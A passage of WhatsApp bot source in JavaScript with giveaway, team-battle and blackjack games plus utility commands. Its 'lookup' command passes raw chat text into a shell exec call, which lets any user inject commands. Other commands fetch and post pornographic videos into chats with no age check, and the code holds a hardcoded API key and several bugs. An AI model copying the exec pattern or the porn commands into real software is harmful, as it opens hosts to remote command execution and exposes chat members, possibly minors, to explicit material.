            await David.sendMessage(
                m.chat,
                { text: mess.OnlyOwner },
                { quoted: m }
            );
        } else if (!subArgs) {
            await David.sendMessage(
                m.chat,
                { text: `*☘️ Example :*\n${prefix}giveaway start query` },
                { quoted: m }
            );
        } else {
            giveawayStatus = true;
            giveawayName = subArgs;
            giveawayUser = {};
            await David.sendMessage(
                m.chat,
                { text: `Giveaway "${subArgs}" has started!\nTo join, type:\n${prefix}giveaway join` },
                { quoted: m }
            );
        }
    } else if (subCommand === "join") {
        if (!giveawayStatus) {
            await David.sendMessage(
                m.chat,
                { text: `There are no giveaways currently going on.` },
                { quoted: m }
            );
        } else if (giveawayUser[m.sender]) {
            await David.sendMessage(
                m.chat,
                { text: `You are already registered for the giveaway.` },
                { quoted: m }
            );
        } else {
            giveawayUser[m.sender] = true;
            await David.sendMessage(
                m.chat,
                { text: `You have entered the "${giveawayName}" giveaway!` },
                { quoted: m }
            );
        }
    } else if (subCommand === "close") {
        if (!LorenzoTheCreator) {
            await David.sendMessage(
                m.chat,
                { text: mess.owner },
                { quoted: m }
            );
        } else {
            giveawayStatus = false;
            await David.sendMessage(
                m.chat,
                { text: `Giveaway "${giveawayName}" has closed!` },
                { quoted: m }
            );
        }
    } else if (subCommand === "roll") {
        if (!LorenzoTheCreator) {
            await David.sendMessage(
                m.chat,
                { text: mess.owner },
                { quoted: m }
            );
        } else {
            const users = Object.keys(giveawayUser);
            if (users.length === 0) {
                await David.sendMessage(
                    m.chat,
                    { text: `There are no participants in the giveaway.` },
                    { quoted: m }
                );
            } else {
                const initialMessage = await David.sendMessage(
                    m.chat,
                    { text: `Choosing a giveaway winner "${giveawayName}"...` },
                    { quoted: m }
                );

                const winner = users[Math.floor(Math.random() * users.length)];
                const winnerMention = `@${winner.split('@')[0]}`;

                const displayWinners = [];
                for (let i = 0; i < 8; i++) {
                    displayWinners.push(users[Math.floor(Math.random() * users.length)]);
                }

                const editMessageWithDelay = async (text, mentions, delay) => {
                    return new Promise((resolve) => {
                        setTimeout(async () => {
                            await David.sendMessage(
                                m.chat,
                                {
                                    text: text,
                                    edit: initialMessage.key,
                                    mentions: mentions
                                },
                                { quoted: m }
                            );
                            resolve();
                        }, delay);
                    });
                };

                const delays = [100, 200, 300, 400, 500, 650, 800, 1000];
                for (let i = 0; i < displayWinners.length; i++) {
                    const currentWinner = displayWinners[i];
                    await editMessageWithDelay(
                        `Congratulations! The winner of the "${giveawayName}" giveaway is @${currentWinner.split('@')[0]}`,
                        [currentWinner],
                        delays[i]
                    );
                }

                await editMessageWithDelay(
                    `Congratulations! The winner of the "${giveawayName}" giveaway is @${winner.split('@')[0]}`,
                    [winner],
                    delays[delays.length - 1] + 1000
                );

                await David.sendMessage(
                    m.chat,
                    {
                        text: `Please confirm the winner to the organizer, otherwise the prize will be forfeited!`,
                        mentions: [winner]
                    },
                    { quoted: m }
                );
            }
        }
    } else if (subCommand === "delete") {
        if (!LorenzoTheCreator) {
            await David.sendMessage(
                m.chat,
                { text: mess.owner },
                { quoted: m }
            );
        } else {
            giveawayStatus = false;
            giveawayName = '';
            giveawayUser = {};
            await David.sendMessage(
                m.chat,
                { text: `Giveaway has been reset!` },
                { quoted: m }
            );
        }
    } else if (subCommand === "reroll") {
        if (!LorenzoTheCreator) {
            await David.sendMessage(
                m.chat,
                { text: mess.owner },
                { quoted: m }
            );
        } else {
            const users = Object.keys(giveawayUser);
            if (users.length === 0) {
                await David.sendMessage(
                    m.chat,
                    { text: `There are no participants in the giveaway.` },
                    { quoted: m }
                );
            } else {
                let numToEliminate = Math.max(1, Math.floor(users.length * 0.25));
                
                if (users.length <= 5) {
                    numToEliminate = 1;
                }

                const eliminatedUsers = [];
                
                while (eliminatedUsers.length < numToEliminate) {
                    const index = Math.floor(Math.random() * users.length);
                    const user = users[index];
                    if (!eliminatedUsers.includes(user)) {
                        eliminatedUsers.push(user);
                        delete giveawayUser[user];
                    }
                }
                
                const remainingUsers = Object.keys(giveawayUser);
                
                if (remainingUsers.length <= 1) {
                    giveawayStatus = false;
                    const winner = remainingUsers[0];
                    await David.sendMessage(
                        m.chat,
                        {
                            text: `Giveaway "${giveawayName}" is over!\nThe winner is @${winner.split('@')[0]}!`,
                            mentions: [winner]
                        },
                        { quoted: m }
                    );
                } else {
                    await David.sendMessage(
                        m.chat,
                        {
                            text: `Eliminated users:\n${eliminatedUsers.map(user => `@${user.split('@')[0]}`).join('\n')}\nRemaining participants: ${remainingUsers.length}`,
                        },
                        { quoted: m }
                    );
                }
            }
        }
    } else {
        await David.sendMessage(
            m.chat,
            { text: `Unknown command.\nUse one of: start, join, close, roll, delete, reroll.\n*☘️ Example :* ${prefix}giveaway join` },
            { quoted: m }
        );
    }
}
break;
case 'genshinimpact': {
	let teks;
	if (args.length >= 1) {
		teks = args.slice(0).join(" ");
	} else if (m.quoted && m.quoted.text) {
		teks = m.quoted.text;
	} else {
		throw `Usage:\n/${command} > name <\nExample:\n/${command} keqing`;
	}

	m.reply(mess.wait);

let data = await displayCharacterDetails(teks)
m.reply(data)

}
break
case 'war': {
  David.war = David.war ? David.war : {}
  David.war2 = David.war2 ? David.war2 : {}
  // fungsi delay
  function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

function getRandom(minn,maxx){
 let min = Math.ceil(minn)
 let max = Math.floor(maxx)
  return Math.floor(Math.random()*(max-min+1)) + min
}

  // fungsi turn kalau ada yg afk
  async function cekAFK(x){
    let turn = x
    let time = David.war2[m.chat].time
    await sleep(90000)
    let turnNow = David.war2[m.chat].turn
    let timeNow = David.war2[m.chat].time
    // m.reply("Turn : " + turn + "-" + turnNow + "\n\nTime : " + time + "-" + timeNow)
    if (turn == turnNow && time == timeNow){
      David.war[m.chat][turn].hp -= 2500
      sendButton(m.chat, `*@${David.war[m.chat][turn].user.split('@')[0]} Usage:\n/${command} > name <\nExample:\n/${command} keqing`)
      await sleep(3000)
      // cek kalau mati
      if (David.war[m.chat][turn].hp <= 0) {
        sendButton(m.chat, `*@${David.war[m.chat][turn].user.split('@')[0]} already dead because HP (Health Point) is used up.*`)
        // cek tim nya
        let playerTotal = 0
        let playerKalah = 0
        if (turn < 5){
          for (let i=0;i<5;i++){
            if (David.war[m.chat][i].user != ""){
              playerTotal += 1
              if (David.war[m.chat][i].hp <= 0)
              playerKalah += 1
            }
          }
          // m.reply(playerTotal + "T-K" + playerKalah)
          if (playerTotal > 0 && playerTotal == playerKalah){
            var teamA = []
            var teamB = []
            var teamAB = []
            for (let j=0;j<5;j++){
              if (David.war[m.chat][j].user != ""){
                teamA.push(David.war[m.chat][j].user)
                teamAB.push(David.war[m.chat][j].user)
              }
            }
            for (let j=5;j<10;j++){
              if (David.war[m.chat][j].user != ""){
                teamB.push(David.war[m.chat][j].user)
                teamAB.push(David.war[m.chat][j].user)
              }
            }
            sendButton(m.chat,  `*TEAM B WON BECAUSE TEAM A IS ALL STUPID*`)
            delete David.war[m.chat]
            delete David.war2[m.chat]
          }
        }else {
          for (let i=5;i<10;i++){
            if (David.war[m.chat][i].user != ""){
              playerTotal += 1
              if (David.war[m.chat][i].hp <= 0)
              playerKalah += 1
            }
          }
          m.reply(playerTotal + "T-K" + playerKalah)
          if (playerTotal == playerKalah){
            var teamA = []
            var teamB = []
            var teamAB = []
            for (let j=0;j<5;j++){
              if (David.war[m.chat][j].user != ""){
                teamA.push(David.war[m.chat][j].user)
                teamAB.push(David.war[m.chat][j].user)
              }
            }
            for (let j=5;j<10;j++){
              if (David.war[m.chat][j].user != ""){
                teamB.push(David.war[m.chat][j].user)
                teamAB.push(David.war[m.chat][j].user)
              }
            }
            sendButton(m.chat,  `*TEAM A WON BECAUSE TEAM B IS ALL STUPID*`)
            delete David.war[m.chat]
            delete David.war2[m.chat]
          }
        }
      }
      let pergantian = false
      if (turn < 5){
        for (let i=5;i<10;i++){
          if (David.war[m.chat][i].hp > 0 && David.war[m.chat][i].user != "" && David.war[m.chat][i].turn == false){
            David.war2[m.chat].turn = i
            David.war2[m.chat].time = +1
            pergantian = true
          }
        }
      }else {
        for (let i=0;i<5;i++){
          if (David.war[m.chat][i].hp > 0 && David.war[m.chat][i].user != "" && David.war[m.chat][i].turn == false){
            David.war2[m.chat].turn = i
            David.war2[m.chat].time = +1
            pergantian = true
          }
        }
      }
      if (pergantian == false){
        for (let l=9;l>=0;l--){
          if (David.war[m.chat][l].user != "" && David.war[m.chat][l].hp > 0) {
            David.war2[m.chat].turn = l
            David.war2[m.chat].time = +1
          }
          David.war[m.chat][l].turn == false
        }
      }
      await sleep(3000)
      sendButton(m.chat, `*@${David.war[m.chat][David.war2[m.chat].turn].user.split('@')[0]}'s turn to attack (Time 90 seconds)*\n\n.war player = player statistics\n.attack @tag = attack opponent`)
      cekAFK(David.war2[m.chat].turn)
    }
  }

  if (!(m.chat in David.war)) return m.reply(`*There are no games in this group.*`)
  if (!David.war2[m.chat].war) return m.reply(`*War has not started yet, when ".war start" to start the fight.*`)
  for (let i=0;i<10;i++){
    if (m.sender == David.war[m.chat][i].user){
      if (i != David.war2[m.chat].turn) {
        sendButton(m.chat, `*Now it's @${David.war[m.chat][David.war2[m.chat].turn].user.split('@')[0]}'s turn to attack.*`)
        cekAFK(David.war2[m.chat].turn)
      }
    }
  }
  if (!args[0]) return m.reply(`*Tag the enemy to be attacked*\n*Type .war player*`)
  args[0] = args[0].split('@')[1]
  args[0] += "@s.whatsapp.net"
  let success = false

  if (David.war2[m.chat].turn < 5){
    // return m.reply(args[0])
    for (let i=5;i<10;i++){
      if (David.war[m.chat][i].user == args[0] && David.war[m.chat][i].hp > 0){
        let attacker = m.sender
       let  target = args[0]

        let opportunity = []
        for (let i=0;i<global.db.data.users[attacker].level;i++){
          opportunity.push(attacker)
        }
        for (let i=0;i<global.db.data.users[target].level;i++){
          opportunity.push(target)
        }

        let pointAttacker = 0
        let pointTarget = 0
        for (let i=0;i<10;i++){
          if (opportunity[getRandom(0,opportunity.length)] == attacker) pointAttacker += 1
          else pointTarget += 1
        }

        for (let i=0;i<10;i++){
          if (David.war[m.chat][i].user == target){
            David.war[m.chat][i].hp -= pointAttacker * 500
            David.war[m.chat][David.war2[m.chat].turn].turn = true
            sendButton(m.chat, `*@${attacker.split('@')[0]} attacks @${target.split('@')[0]} until his health is reduced to ${pointAttacker * 500} (Remaining HP: ${David.war[m.chat][i].hp})*\n\n*@${attacker.split('@')[0]} [${pointAttacker*10}%] - [${pointTarget*10}%] @${target.split('@')[0]}*\n*Level greatly affects success..*`)
            await sleep(2000)
            if (David.war[m.chat][i].hp <= 0) sendButton(m.chat, `*@${target.split(`@`)[0]} has died in battle.*`)
            success = true
          }
        }
      }
    }
    if (success == false) {
      return m.reply(`*Enter the correct game player list, boss.*\n\n*Check ".war player"*`)
    }else {
      for (let i=0;i<10;i++){
        if (m.sender == David.war[m.chat][i].user){
          David.war[m.chat][i].turn = true
        }
      }
    }
  }else {
    for (let i=0;i<5;i++){
      if (David.war[m.chat][i].user == args[0] && David.war[m.chat][i].hp > 0){
        let attacker = m.sender
        let target = args[0]

        let opportunity = []
        for (let i=0;i<global.db.data.users[attacker].level;i++){
          opportunity.push(attacker)
        }
        for (let i=0;i<global.db.data.users[target].level;i++){
          opportunity.push(target)
        }

        let pointAttacker = 0
        let pointTarget = 0
        for (i=0;i<10;i++){
          if (opportunity[getRandom(0,opportunity.length)] == attacker) pointAttacker += 1
          else pointTarget += 1
        }

        for (let i=0;i<10;i++){
          if (David.war[m.chat][i].user == target){
            David.war[m.chat][i].hp -= pointAttacker * 500
            sendButton(m.chat, David.war[m.chat][David.war2[m.chat].turn].turn)
            David.war[m.chat][David.war2[m.chat].turn].turn = true
            sendButton(m.chat, David.war[m.chat][David.war2[m.chat].turn].turn)
            sendButton(m.chat, `*@${attacker.split('@')[0]} attacks @${target.split('@')[0]} until his health is reduced to ${pointAttacker * 500} (Remaining HP: ${David.war[m.chat][i].hp})*\n\n*@${attacker.split('@')[0]} [${pointAttacker*10}%] - [${pointTarget*10}%] @${target.split('@')[0]}*\n*Level greatly affects success.*`)
            await sleep(2000)
            if (David.war[m.chat][i].hp <= 0) sendButton(m.chat, `*@${target.split(`@`)[0]} died in battle.*`)
            success = true
          }
        }
      }
    }
    if (success == false) {
      return m.reply(`*Enter the correct game player list, boss.*\n\n*Check ".war player"*`)
    }else {
      for (let i=0;i<10;i++){
        if (m.sender == David.war[m.chat][i].user){
          David.war[m.chat][i].turn = true
        }
      }
    }
  }

  if (David.war2[m.chat].turn < 5){
    let userAktif = 0
    let userMati = 0
    for (let i=5;i<10;i++){
      if (David.war[m.chat][i].user != ""){
        userAktif += 1
        if (David.war[m.chat][i].hp <= 0){
          userMati += 1
        }
      }
    }
    // m.reply(userAktif + "/" + userMati)
    if(userAktif == userMati){
      var teamA = []
      var teamB = []
      var teamAB = []
      for (let j=0;j<5;j++){
        if (David.war[m.chat][j].user != ""){
          teamA.push(David.war[m.chat][j].user)
          teamAB.push(David.war[m.chat][j].user)
        }
      }
      for (let j=5;j<10;j++){
        if (David.war[m.chat][j].user != ""){
          teamB.push(David.war[m.chat][j].user)
          teamAB.push(David.war[m.chat][j].user)
        }
      }
      sendButton(m.chat,  `*TEAM A WON BECAUSE TEAM B IS ALL STUPID*`)
      delete David.war[m.chat]
      delete David.war2[m.chat]
    }
    let turn1 = David.war2[m.chat].turn
    let turn2 = David.war2[m.chat].turn
    for (let k=5;k<10;k++){
      if (David.war[m.chat][k].hp > 0 && David.war[m.chat][k].user != "" && David.war[m.chat][k].turn == false) {
        David.war2[m.chat].turn = k
        David.war2[m.chat].time = +1
        turn2 = David.war2[m.chat].turn
      }
    }
    if (turn1 == turn2){
      for (i=0;i<10;i++){
        David.war[m.chat][i].turn = false
      }
      for(i=0;i<5;i++){
        if (David.war[m.chat][i].hp > 0 && David.war[m.chat][i].user != "" && David.war[m.chat][i].turn == false) {
          David.war2[m.chat].turn = i
          David.war2[m.chat].time = +1
        }
      }
    }
    await sleep(2000)
    sendButton(m.chat, `*@${David.war[m.chat][David.war2[m.chat].turn].user.split('@')[0]}'s turn to attack (Time 90 seconds)*\n\n.war player = player statistics\n.attack @tag = attack opponent`)
    cekAFK(David.war2[m.chat].turn)
  }else {
    let userAktif = 0
    let userMati = 0
    for (let i=0;i<5;i++){
      if (David.war[m.chat][i].user != ""){
        userAktif += 1
        if (David.war[m.chat][i].hp <= 0){
          userMati += 1
        }
      }
    }
    if(userAktif == userMati){
      var teamA = []
      var teamB = []
      var teamAB = []
      for (let j=0;j<5;j++){
        if (David.war[m.chat][j].user != ""){
          teamA.push(David.war[m.chat][j].user)
          teamAB.push(David.war[m.chat][j].user)
        }
      }
      for (let j=5;j<10;j++){
        if (David.war[m.chat][j].user != ""){
          teamB.push(David.war[m.chat][j].user)
          teamAB.push(David.war[m.chat][j].user)
        }
      }
      sendButton(m.chat,  `*TEAM B WON BECAUSE TEAM A IS ALL STUPID*`)
      delete David.war[m.chat]
      delete David.war2[m.chat]
    }
    let turn1 = David.war2[m.chat].turn
    let turn2 = David.war2[m.chat].turn
    for (let k=0;k<5;k++){
      if (David.war[m.chat][k].hp > 0 && David.war[m.chat][k].user != "" && David.war[m.chat][k].turn == false) {
        David.war2[m.chat].turn = k
        David.war2[m.chat].time = +1
        turn2 = David.war2[m.chat].turn
      }
    }
    if (turn1 == turn2){
      for (let i=0;i<10;i++){
        David.war[m.chat][i].turn = false
      }
      for(let i=0;i<5;i++){
        if (David.war[m.chat][i].hp > 0 && David.war[m.chat][i].user != "" && David.war[m.chat][i].turn == false) {
          David.war2[m.chat].turn = i
          David.war2[m.chat].time = +1
        }
      }
    }
    await sleep(2000)
    sendButton(m.chat, `*Giliran @${David.war[m.chat][David.war2[m.chat].turn].user.split('@')[0]} untuk menyerang (Waktu 90 detik)*\n\n.war player = statistik pemain\n.attack @tag = serang lawan`)
    cekAFK(David.war2[m.chat].turn)
  }

  let totalUser = 0
  let totalTurn = 0
  for (let i=0;i<10;i++){
    if (David.war[m.chat][i].user != "") totalUser += 1
    if (David.war[m.chat][i].turn == true) totalTurn += 1
  }
  if (totalTurn == totalUser) {
    for (i=0;i<10;i++){
      David.war[m.chat][i].turn = false
    }
  }

}
break


case 'rizz': {
    try {
        const apiKey = 'gifted-md'; // API key
        const apiUrl = `https://api.giftedtech.my.id/api/fun/flirt?apikey=${apiKey}`;
        
        // Fetch a flirty line
        const response = await axios.get(apiUrl);

        if (response.data.status === 200 && response.data.success) {
            const flirtyLine = response.data.result;

            // Send the flirty line
            reply(`${flirtyLine}`);
        } else {
            // Handle unsuccessful response
            reply('Please try again later.');
        }
    } catch (error) {
        // Handle specific errors without exposing logs
        if (error.response) {
            reply(`API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            reply('No response received from the API. Please try again later.');
        } else {
            reply(`An error occurred: ${error.message}`);
        }
    }
    break;
}

 case 'hentai': {
    try {
        // Fetch data from the hentai API
        let apiUrl = `https://api.agatz.xyz/api/hentaivid`;
        let response = await fetch(apiUrl);
        let result = await response.json();

        if (result.status === 200 && result.data.length > 0) {
            // Pick a random video from the list
            let randomVideo = result.data[Math.floor(Math.random() * result.data.length)];
            let videoUrl = randomVideo.video_1 || randomVideo.link;
            let title = randomVideo.title;
            let body = `*Title:* ${title}\n*Category:* ${randomVideo.category}\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™`;

            // Send the video file directly
            David.sendMessage(m.chat, { video: { url: videoUrl }, caption: body }, { quoted: m });
        } else {
            reply('No hentai videos found.');
        }
    } catch (error) {
        reply('Error fetching hentai videos. Please try again later.');
    }
}
break;

case 'lockotp': case 'otplock': {
await David.sendMessage(m?.chat, {react: {text: `⏳`,key: m?.key,}}) 
await David.sendMessage(m?.chat, {text: '`This Command Is for Premuim Users Only`\n\n> Type *.premuim* To Become A Premium User',key: m?.key,}) 
await David.sendMessage(m?.chat, {react: {text: `❌`,key: m?.key,}}) 
}
break; 

case 'antibug': case 'antivirtex': {
await David.sendMessage(m?.chat, {react: {text: `🔍`,key: m?.key,}}) 
await David.sendMessage(m?.chat, {text: '`Checking Database.....`',key: m?.key,})  
await David.sendMessage(m?.chat, {text: '`This Command Is for Premuim Users Only`\n\n> Type *.premuim* To Become A Premium User And Get Protection Againt WhatsApp Bugs',key: m?.key,}) 
await David.sendMessage(m?.chat, {react: {text: `❌`,key: m?.key,}}) 
}
break; 

case 'xvideosearch': case 'xxxsearch': {
    if (!text) return reply(`Please provide a search query. Example: ${prefix + command} sister`);

    try {
        // Call the search API with the search keyword
        let apiUrl = `https://api.agatz.xyz/api/xvideo?message=${encodeURIComponent(text)}`;
        let response = await fetch(apiUrl);
        let result = await response.json();

        if (result.status === 200) {
            // Prepare the search result
            let videoInfo = result.data[0]; // Assuming the first result is desired
            let body = `*XVideo Search Result:*
> Title: *${videoInfo.title}*
> Views: *${videoInfo.views}*
> Duration: *${videoInfo.duration}*
> URL: *${videoInfo.url}*`;

            David.sendMessage(m.chat, { image: { url: videoInfo.thumb }, caption: body }, { quoted: m });

            // Store the video URL for later David
            global.db.data.users[m.sender].lastXVideoUrl = videoInfo.url;
        } else {
            reply('Failed to fetch search results.');
        }
    } catch (error) {
        reply('Error fetching search results. Please try again.');
    }
}
break;
 
 
 case 'technews': {
    // No need to check for args, since it's fetching random news
    await David.sendMessage(m?.chat, { react: { text: `⏳`, key: m?.key, } });
    reply('`Fetching the latest tech news...`');

    // Fetch tech news from the API
    let technewsData = await fetchJson(`https://bk9.fun/details/tnews`);

    if (technewsData.status) {
        let title = `${technewsData.BK9.title}`;
        let description = `${technewsData.BK9.desc}`;
        let link = `${technewsData.BK9.link}`;
       

        const newsMessage = `*Title:* ${title}\n*Description:* ${description}\n\n[Read more](${link})`;

        // Send the tech news with an image
        await David.sendMessage(m.chat, {
            image: { url: imageURL },
            caption: newsMessage
        }, { quoted: m });
    } else {
        reply("Sorry, couldn't fetch the tech news at this time.");
    }
}
break;


case 'xvideodownlad': case 'xxxdownload': {
    let url = global.db.data.users[m.sender].lastXVideoUrl || text;
    if (!url) return reply('No video URL found. Please search for a video using *xvidsearch* or provide a valid URL.');

    try {
        // Call the download API with the video URL
        let apiUrl = `https://api.agatz.xyz/api/xvideodown?url=${encodeURIComponent(url)}`;
        let response = await fetch(apiUrl);
        let result = await response.json();

        if (result.status === 200) {
            let videoUrl = result.data.url;
            let body = `*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™*`;

            // Send the video file directly
            David.sendMessage(m.chat, { video: { url: videoUrl }, caption: body }, { quoted: m });
        } else {
            reply('Failed to fetch the video.');
        }
    } catch (error) {
        reply('Error fetching the video. Please try again.');
    }
}
break;
  
case 'disk': {
  let cp = require ('child_process')
let { promisify } = require ('util')
let exec = promisify(cp.exec).bind(cp)

  await m.reply(`Please Wait`)
  let o
  try {
    o = await exec('cd && du -h --max-depth=1')
  } catch (e) {
    o = e
  } finally {
    let { stdout, stderr } = o
    if (stdout.trim())
    m.reply(stdout)
    if (stderr.trim()) m.reply(stderr)
  }
}
break

case 'lookup': {
  if (!text) return m.reply("Example: .lookup https://www.example.com")
  let cp = require ('child_process')
let { promisify } = require ('util')
let exec = promisify(cp.exec).bind(cp)

  await m.reply(`Please Wait`)
  let o
  try {
    o = await exec('nslookup ' + text)
  } catch (e) {
    o = e
  } finally {
    let { stdout, stderr } = o
    if (stdout.trim())
    m.reply(stdout)
    if (stderr.trim()) m.reply(stderr)
  }
}
break
case 'server': {
  let cp = require ('child_process')
let { promisify } = require ('util')
let exec = promisify(cp.exec).bind(cp)

  await m.reply(`Please Wait`)
  let o
  try {
    o = await exec('df -h')
  } catch (e) {
    o = e
  } finally {
    let { stdout, stderr } = o
    if (stdout.trim())
    m.reply(stdout)
    if (stderr.trim()) m.reply(stderr)
  }
}
break
case 'afk': {
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${pushname}... Telah Afk Dengan Alasan ${text ? ': ' + text : ''}`)
}
break
case 'blackjack': {
  class Blackjack {
    decks;
    state = "waiting";
    player = [];
    dealer = [];
    table = {
        player: {
            total: 0,
            cards: [],
        },
        dealer: {
            total: 0,
            cards: [],
        },
        bet: 0,
        payout: 0,
        doubleDowned: false,
    };
    cards;
    endHandlers = [];
    constructor(decks) {
        this.decks = validateDeck(decks);
    }
    placeBet(bet) {
        if (bet <= 0) {
            throw new Error("You must place a bet greater than 0");
        }
        this.table.bet = bet;
    }
    start() {
        if (this.table.bet <= 0) {
            throw new Error("You must place a bet before starting the game");
        }
        this.cards = new Deck(this.decks);
        this.cards.shuffleDeck(2);
        this.player = this.cards.dealCard(2);
        let dealerFirstCard;
        do {
            dealerFirstCard = this.cards.dealCard(1)[0];
        } while (dealerFirstCard.value > 11);
        this.dealer = [dealerFirstCard, ...this.cards.dealCard(1)];
        this.updateTable();
        return this.table;
    }
    hit() {
        if (this.state === "waiting") {
            const newCard = this.cards.dealCard(1)[0];
            this.player.push(newCard);
            this.updateTable();
            const playerSum = sumCards(this.player);
            const dealerSum = sumCards(this.dealer);
            if (playerSum === dealerSum) {
                this.state = "draw";
                this.emitEndEvent();
            }
            else if (playerSum === 21) {
                this.state = "player_blackjack";
                this.emitEndEvent();
            }
            else if (playerSum > 21) {
                this.state = "dealer_win";
                this.emitEndEvent();
            }
            return this.table;
        }
    }
    stand() {
        let dealerSum = sumCards(this.dealer);
        let playerSum = sumCards(this.player);
        if (playerSum <= 21) {
            while (dealerSum < 17) {
                this.dealer.push(...this.cards.dealCard(1));
                dealerSum = sumCards(this.dealer);
                this.updateTable();
            }
        }
        if (playerSum <= 21 && (dealerSum > 21 || dealerSum < playerSum)) {
            if (playerSum === 21) {
                this.state = "player_blackjack";
            }
            else {
                this.state = "player_win";
            }
        }
        else if (dealerSum === playerSum) {
            this.state = "draw";
        }
        else {
            this.state = dealerSum === 21 ? "dealer_blackjack" : "dealer_win";
        }
        this.emitEndEvent();
    }
    doubleDown() {
        if (this.canDoubleDown()) {
            this.table.doubleDowned = true;
            this.player.push(...this.cards.dealCard(1));
            this.updateTable();
            this.stand();
        }
        else {
            throw new Error("You can only double down on the first turn");
        }
    }
    calculatePayout() {
        if (this.state === "player_blackjack") {
            this.table.payout = this.table.bet * 1.5;
        }
        else if (this.state === "player_win") {
            this.table.payout = this.table.bet;
        }
        else if (this.state === "dealer_win" ||
            this.state === "dealer_blackjack") {
            this.table.payout = 0;
        }
        else if (this.state === "draw") {
            this.table.payout = this.table.bet;
        }
        if (this.table.doubleDowned && this.state !== "draw") {
            this.table.payout *= 2;
        }
        this.table.payout = Math.round(this.table.payout);
    }
    canDoubleDown() {
        return this.state === "waiting" && this.player.length === 2;
    }
    onEnd(handler) {
        this.endHandlers.push(handler);
    }
    emitEndEvent() {
        this.calculatePayout();
        for (let handler of this.endHandlers) {
            handler({
                state: this.state,
                player: formatCards(this.player),
                dealer: formatCards(this.dealer),
                bet: this.table.bet,
                payout: this.table.payout,
            });
        }
    }
    updateTable() {
        this.table.player = formatCards(this.player);
        this.table.dealer = formatCards(this.dealer);
    }
}

class Deck {
    deck = [];
    dealtCards = [];
    constructor(decks) {
        for (let i = 0; i < decks; i++) {
            this.createDeck();
        }
    }
    createDeck() {
        const card = (suit, value) => {
            let name = value + " of " + suit;
            if (value.toUpperCase().includes("J") ||
                value.toUpperCase().includes("Q") ||
                value.toUpperCase().includes("K"))
                value = "10";
            if (value.toUpperCase().includes("A"))
                value = "11";
            return { name, suit, value: +value };
        };
        const values = [
            "2",
            "3",
            "4",
            "5",
            "6",
            "7",
            "8",
            "9",
            "10",
            "J",
            "Q",
            "K",
            "A",
        ];
        const suits = ["♣️", "♦️", "♠️", "♥️"];
        for (let s = 0; s < suits.length; s++) {
            for (let v = 0; v < values.length; v++) {
                this.deck.push(card(suits[s], values[v]));
            }
        }
    }
    shuffleDeck(amount = 1) {
        for (let i = 0; i < amount; i++) {
            for (let c = this.deck.length - 1; c >= 0; c--) {
                const tempVal = this.deck[c];
                let randomIndex = Math.floor(Math.random() * this.deck.length);
                while (randomIndex === c) {
                    randomIndex = Math.floor(Math.random() * this.deck.length);
                }
                this.deck[c] = this.deck[randomIndex];
                this.deck[randomIndex] = tempVal;
            }
        }
    }
    dealCard(numCards) {
        const cards = [];
        for (let c = 0; c < numCards; c++) {
            const dealtCard = this.deck.shift();
            if (dealtCard) {
                cards.push(dealtCard);
                this.dealtCards.push(dealtCard);
            }
        }
        return cards;
    }
}

function sumCards(cards) {
    let value = 0;
    let numAces = 0;
    for (const card of cards) {
        value += card.value;
        numAces += card.value === 11 ? 1 : 0;
    }
    while (value > 21 && numAces > 0) {
        value -= 10;
    }
    return value;
}

function formatCards(cards) {
    return { total: sumCards(cards), cards };
}

function validateDeck(decks) {
    if (!decks) {
        throw new Error("A deck must have a number of decks");
    }
    if (decks < 1) {
        throw new Error("A deck must have at least 1 deck");
    }
    if (decks > 8) {
        throw new Error("A deck can have at most 8 decks");
    }
    return decks;
}

const formatter = new Intl.NumberFormat('id-ID', {
  style: 'currency',
  currency: 'IDR'
});

const templateBlackjackMessage = (prefix, command, David, m, blackjack) => {
    const { table, state } = blackjack;
    const { bet, dealer, player, payout } = table;
    let message = '';
    const dealerCards = dealer.cards.map(card => `${card.name}`).join(', ');
    const dealerTotal = dealer.total;
    const playerCards = player.cards.map(card => `${card.name}`).join(', ');
    const playerTotal = player.total;

    let hiddenDealerCards = dealer.cards.slice(0, -1).map(card => `${card.name}`).join(', ');
    if (dealer.cards.length > 1) {
        hiddenDealerCards += ', ❓';
    } else {
        hiddenDealerCards += `, ${dealer.cards[0].name}`;
    }
    
    switch (state) {
        case "player_win":
        case "dealer_win":
        case "draw":
        case "player_blackjack":
        case "dealer_blackjack":
            hiddenDealerCards = dealer.cards.map(card => `${card.name}`).join(', ');
            message = `*\`🃏 • B L A C K J A C K •\`*

╭───┈ •
│ *Your Cards:*\n│ \`${playerCards}\`
│ *Your Total:*\n│ \`${playerTotal}\`
├───┈ •
│ *Dealer's Cards:*\n│ \`${dealerCards}\`
│ *Dealer's Total:*\n│ \`${dealerTotal > 21 ? 'BUST' : dealerTotal}\`
╰───┈ •

> *\`${(state === "player_win" ? "You win! 🎉" : state === "dealer_win" ? "Dealer wins. 😔" : state === "draw" ? "Draw. 🤝" : state === "player_blackjack" ? "Blackjack! 🥳" : "Dealer got Blackjack! 😔").toUpperCase()}\`*\n*Bet:*\n- \`\`\`${formatter.format(bet)}\`\`\`\n*Payout:*\n- \`\`\`${formatter.format(payout)}\`\`\`
`;
            global.db.data.users[David.blackjack[m.chat].idPemain]
            delete David.blackjack[m.chat];
            break;
        default:
            message = `*\`🃏 • B L A C K J A C K •\`*

╭───┈ •
│ *Your Cards:*\n│ \`${playerCards}\`
│ *Your Total:*\n│ \`${playerTotal}\`
├───┈ •
│ *Dealer's Cards:*\n│ \`${hiddenDealerCards}\`
│ *Dealer's Total:*\n│ \`${dealerTotal > 21 ? 'BUST' : '❓'}\`
╰───┈ •

*Bet:*\n- \`\`\`${formatter.format(bet)}\`\`\`

Type *\`${prefix + command} hit\`* to draw a card.
Type *\`${prefix + command} stand\`* to end your turn.`;
            break;
    }
    return message;
}

    David.blackjack = David.blackjack || {};
    let aksi = args[0]
    let argumen = args[1]

    try {
        switch (aksi) {
            case 'end':
                if (David.blackjack[m.chat]?.idPemain === m.sender) {
                    delete David.blackjack[m.chat];
                    await reply('*Anda keluar dari sesi blackjack.* 👋');
                } else {
                    await reply('*Tidak ada sesi blackjack yang sedang berlangsung atau Anda bukan pemainnya.*');
